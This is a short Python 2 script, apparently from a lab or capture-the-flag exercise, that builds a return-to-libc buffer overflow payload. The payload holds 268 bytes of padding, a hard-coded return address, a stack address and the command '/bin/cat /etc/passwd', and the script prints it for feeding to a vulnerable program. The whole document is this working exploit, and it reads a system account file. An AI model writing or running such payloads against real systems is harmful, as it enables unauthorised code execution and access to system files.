exploit = b"A"*(268) + b"\xb0\x5d\xe4\xf7" + b"B"*4 + b"\xa8\xd8\xff\xff" + "/bin/cat /etc/passwd\x00"
print exploit
